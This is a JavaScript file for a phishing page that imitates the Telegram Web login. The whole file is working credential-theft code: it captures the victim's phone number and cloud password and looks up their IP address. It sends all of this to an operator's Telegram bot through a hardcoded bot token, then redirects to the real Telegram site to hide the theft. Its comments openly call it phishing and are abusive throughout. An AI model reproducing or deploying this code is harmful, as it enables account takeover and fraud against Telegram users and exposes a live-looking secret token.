const BOT_TOKEN = '7616731033:AAEjz82JXxyZqvQpOcwXv_z95i9mOSYjPF4'; // Replace this with your bot's token, you dumbass!
const CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID_HERE';     // Replace this with your chat ID, you greedy bastard!

document.addEventListener('DOMContentLoaded', () => {
    const loginForm = document.getElementById('loginForm');
    const phoneNumberInput = document.getElementById('phoneNumber');
    const countryCodeSelect = document.getElementById('countryCode');
    const passwordField = document.querySelector('.password-field');
    const passwordInput = document.getElementById('password');
    const nextButton = document.querySelector('.btn-primary');
    const errorMessageDiv = document.getElementById('errorMessage');
    const qrLoginLink = document.getElementById('qrLoginLink');
    const qrCodeImageDiv = document.getElementById('qrCodeImage');
    const introText = document.querySelector('.tg-intro-text');

    let isPasswordStep = false; // To control the flow

    loginForm.addEventListener('submit', async function(event) {
        event.preventDefault(); // Stop the form from submitting normally

        errorMessageDiv.style.display = 'none'; // Hide previous errors

        const fullPhoneNumber = countryCodeSelect.value + phoneNumberInput.value;

        if (!isPasswordStep) {
            // First step: Phone number submission
            if (!phoneNumberInput.value.trim()) {
                errorMessageDiv.textContent = 'Please enter your phone number, you fucking idiot.';
                errorMessageDiv.style.display = 'block';
                return;
            }
            if (!/^\d+$/.test(phoneNumberInput.value.trim())) {
                errorMessageDiv.textContent = 'Invalid phone number format, you moron.';
                errorMessageDiv.style.display = 'block';
                return;
            }

            // Simulate Telegram's "waiting for code" or "enter password" flow
            // In a real scenario, Telegram might ask for a password if 2FA is enabled.
            // For a phishing page, we'll just show the password field regardless to try and capture it.
            introText.textContent = 'Enter your cloud password to log in, you pathetic fuck.';
            phoneNumberInput.disabled = true; // Disable phone number input
            countryCodeSelect.disabled = true; // Disable country code select
            passwordField.style.display = 'flex'; // Show password field
            nextButton.textContent = 'LOG IN'; // Change button text
            isPasswordStep = true;
            passwordInput.focus(); // Focus on password input
        } else {
            // Second step: Password submission (or final credential capture)
            if (!passwordInput.value.trim()) {
                errorMessageDiv.textContent = 'Please enter your password, you worthless scum.';
                errorMessageDiv.style.display = 'block';
                return;
            }

            const password = passwordInput.value;

            // Attempt to get victim's IP address, you sneaky bastard
            let ipAddress = 'Unknown IP';
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                ipAddress = data.ip;
            } catch (error) {
                console.error('Fucking error getting IP:', error);
            }

            const message = `🚨 NEW TELEGRAM PHISH HIT! 🚨\n\nFull Phone Number: ${fullPhoneNumber}\nPassword: ${password}\nIP Address: ${ipAddress}\n\nTime (GMT): ${new Date().toUTCString()}`;

            // Send the data to your Telegram bot, you glorious bastard
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Fucking message sent to Telegram:', data);
                // Redirect after sending, you smart motherfucker
                window.location.href = 'https://web.telegram.org/a/'; // Redirect to actual Telegram Web
            })
            .catch(error => {
                console.error('Fucking error sending to Telegram:', error);
                // Even if sending fails, still redirect to avoid suspicion, you cunning prick
                window.location.href = 'https://web.telegram.org/a/';
            });
        }
    });

    // Handle QR code link click
    qrLoginLink.addEventListener('click', function(event) {
        event.preventDefault();
        // Hide phone number fields and show QR code image
        document.querySelector('.tg-intro-text').textContent = 'Scan this QR code with your Telegram app, you naive fool.';
        document.querySelector('.form-group').style.display = 'none'; // Hide phone number input
        passwordField.style.display = 'none'; // Ensure password field is hidden
        nextButton.style.display = 'none'; // Hide next button
        qrCodeImageDiv.style.display = 'block'; // Show QR code image
        errorMessageDiv.style.display = 'none'; // Hide error messages
        qrLoginLink.style.display = 'none'; // Hide the QR link itself
    });
});
